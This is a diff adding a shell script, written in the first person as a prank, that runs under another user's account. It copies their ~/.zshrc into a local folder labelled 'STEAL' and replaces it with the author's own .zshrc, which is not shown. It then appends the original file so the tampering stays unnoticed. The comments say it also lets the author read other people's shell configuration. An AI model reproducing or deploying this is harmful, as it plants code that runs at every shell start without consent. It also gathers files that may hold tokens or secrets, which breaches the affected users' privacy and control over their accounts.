@@ -1,0 +1,20 @@
+#!/bin/sh
+
+#i copy their .zshrc file
+#i overwrite theirs with my prank
+#i append their file back to the overwrite so theirs is at the bottom
+#their alias commands and whatever remain intact.
+
+#also, this way i can see what people are running in their .zshrc, and if any of them have any timesavers i could use
+
+
+STEAL=theirz
+USR=$(whoami)
+
+if [ -f ~/.zshrc ] ; then
+	cp ~/.zshrc ./$STEAL/$USR
+fi
+cp ./\.zshrc ~/.zshrc
+if [ -f ./$STEAL/$USR/\.zshrc ] ; then
+	cat ./$STEAL/$USR/\.zshrc >> ~/.zshrc
+fi
